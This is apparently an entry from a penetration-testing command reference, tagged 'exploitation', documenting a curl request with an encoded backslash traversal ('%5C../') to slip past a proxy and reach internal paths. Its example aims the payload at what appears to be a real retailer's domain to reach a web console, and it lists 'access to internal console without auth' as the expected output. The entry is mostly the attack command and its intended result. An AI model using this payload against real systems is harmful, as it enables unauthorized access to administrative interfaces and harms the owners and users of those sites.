---
data: curl $BASEURL/%5C../$TARGET
tags:
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:15.200Z'
id: 51ffaa22-723d-4fc2-9bd0-bf7e3443b6f8
verified: false
validated: true
submitted: true
---
# curl-traversal

## Command

```bash
curl $BASEURL/%5C../$TARGET
```

## Description

Send a request with directory traversal payload to bypass proxies and access internal paths.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$BASEURL` | Base vulnerable path | Yes |
| `%5C../` | Encoded traversal | Yes |
| `$TARGET` | Internal target like web-console | Yes |

## Examples

### Basic Usage

```bash
curl http://www.example.starbucks.com.sg/josso/%5C../web-console
```

### Advanced Usage

```bash
curl -L $BASEURL/%5C../$TARGET
```

## Expected Output

Redirect or direct access to internal console without auth.

## Related

- [[commands/curl-browse]]
